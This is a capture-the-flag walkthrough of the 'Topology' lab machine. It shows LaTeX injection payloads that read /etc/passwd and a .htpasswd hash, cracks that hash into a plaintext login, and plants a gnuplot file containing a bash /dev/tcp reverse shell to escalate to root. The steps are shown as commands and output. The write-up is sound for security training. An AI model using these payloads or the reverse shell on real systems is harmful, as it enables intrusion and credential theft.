---
layout: post
author: H4
---

![banner](/images/topology_banner.png)

# discovery

As usualy we are starting with a simple `nmap` scan to identify the attack surface of the attack.

## port scan
```bash
$ nmap -Pn -p- 10.10.11.217
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 22:23 CEST
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 14.51% done; ETC: 22:29 (0:05:00 remaining)
Nmap scan report for 10.10.11.217
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 339.26 seconds
```

Reviewing the website on port 80 reveals a sub domain

```http
GET /index.html HTTP/1.1
Host: topology.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://topology.htb/
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Thu, 29 Jun 2023 20:24:51 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT
ETag: "1a6f-5f27900124a8b-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 6767
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>
...
<a href="http://latex.topology.htb/equation.php">LaTeX Equation Generator</a>
...
```

Performing a sub domain brute force shows that there also is a sub domain named `dev`  
So we have 2 new websites to have a look at.
> `dev.topology.htb`
{: .prompt-info }
> `latex.topology.htb`
{: .prompt-info }

---

# access

The sub domain `dev` is htaccess protected. As account brute force should always be the last resort we continue with having a look at the `latex` sub domain.

![latex website](/images/topology_latex_website.png)

As we can see it is possible to submit LaTex code to the website and the website generates a picture with the rendered code as the result.  
  
Example
LaTex code:
```latex
\frac{x+5}{y-3}
```

```http
GET /equation.php?eqn=+%09%5Cfrac%7Bx%2B5%7D%7By-3%7D&submit= HTTP/1.1
Host: latex.topology.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://latex.topology.htb/equation.php
Upgrade-Insecure-Requests: 1
```

![latex example](/images/topology_latex_example.png)

Googling for LaTex vulnerabilities shows the existence of so called [LaTex injection attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)  
  
Lets try to read a file from the target system  
LaTex payload:
```latex
$\lstinputlisting{/etc/passwd}$
```

```http
GET /equation.php?eqn=$\lstinputlisting{/etc/passwd}$&submit= HTTP/1.1
Host: latex.topology.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://latex.topology.htb/equation.php
Connection: close
Upgrade-Insecure-Requests: 1
```

![passwd file](/images/topology_passwd.png)

> Nice it works! 
{: .prompt-info }

What we know from the file now is that there is user on the system named `vdaisley`.  
We remember that there is a sub domain called `dev` which is password protected, so in the next step we try to read the `.htpasswd` file of this website

LaTex payload:
```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

```http
GET /equation.php?eqn=$\lstinputlisting{/var/www/dev/.htpasswd}$&submit= HTTP/1.1
Host: latex.topology.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://latex.topology.htb/equation.php
Connection: close
Upgrade-Insecure-Requests: 1
```

![hash](/images/topology_hash.png)

> We got a hash for user `vdaisley`!
{: .prompt-info }

Lets crack this hash.
```bash
$ cat dev.hash 
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0

$ john dev.hash --wordlist=/usr/share/wordlists/rockyou.txt              
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 1.62% (ETA: 22:53:17) 0g/s 135514p/s 135514c/s 135514C/s gloria06..gian23
calculus20       (?)     
1g 0:00:00:07 DONE (2023-06-29 22:51) 0.1366g/s 136008p/s 136008c/s 136008C/s calibabe14..calasag
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> Yes we cracked the password! `vdaisley:calculus20`
{: .prompt-info }

Lets check if we can login using the hash.
```bash
$ ssh vdaisley@topology.htb
vdaisley@topology.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jun 30 08:22:11 2023 from 10.10.14.18
-bash-5.0$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
```

---

# post exploitation
## getting the user flag
```bash
-bash-5.0$ ls
linpeas.sh  pspy64  user.txt
-bash-5.0$ cat user.txt 
a42f72ee9e80fe3226febc4ef59c6aae
```

## privilege escalation
Lets start using `pspy64` to see if there are juicy processes running.
```bash
-bash-5.0$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2023/06/30 08:26:26 CMD: UID=0     PID=35881  | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
...
```

> Yes. There seems to be a regular by `root` executed process which is worth a look
{: .prompt-info }

Googling for `gnuplot plt privilege escalation` gives you the following website:
[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/)

So it is possible to execute code on the system when `gnuplot` executes a `plt` file.  
Lets check if we are allowed to write into `/opt/gnuplot`.
```bash
-bash-5.0$ ls -lsah /opt/
total 12K
4.0K drwxr-xr-x  3 root root 4.0K May 19 13:04 .
4.0K drwxr-xr-x 18 root root 4.0K Jun 12 10:37 ..
4.0K drwx-wx-wx  2 root root 4.0K Jun 30 02:50 gnuplot
```

> Yes we are. 
{: .prompt-info }

Lets create a `plt` file, place it in the folder and wait to see if a reverse shell is triggered.  
  
Content of `plt` file
```bash
-bash-5.0$ cat 2.plt 
system "bash -c 'bash -i >& /dev/tcp/10.10.14.18/80 0>&1'"
```

Start listener on attacker machine.
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

Copy `2.plt` to `/opt/gnuplot`.
```bash
-bash-5.0$ cp 2.plt /opt/gnuplot/.
```

Wait for reverse shell.
```bash
$ nc -lvp 80
listening on [any] 80 ...
connect to [10.10.14.18] from topology.htb [10.10.11.217] 59910
bash: cannot set terminal process group (82007): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

> It worked and we are `root`!
{: .prompt-info }

## getting the second flag
```bash
root@topology:~# ls
ls
root.txt
root@topology:~# cat root.txt
cat root.txt
c6a9e87035b810d15598b8dd94b7e3d7
```

Pwned! <@:-) 
